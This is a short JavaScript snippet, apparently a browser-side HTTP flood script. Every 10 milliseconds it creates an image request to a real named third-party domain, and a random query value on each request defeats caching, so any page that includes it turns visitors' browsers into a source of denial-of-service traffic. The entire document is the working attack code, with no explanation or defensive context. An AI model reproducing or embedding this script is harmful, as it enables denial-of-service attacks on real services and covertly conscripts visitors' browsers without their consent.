function imgflood() {  
  var TARGET = 'baidu.com'
  var URI = '/index.php?'
  var pic = new Image()
  var rand = Math.floor(Math.random() * 1000)
  pic.src = '//'+TARGET+URI+rand+'=val'
}
setInterval(imgflood,10)
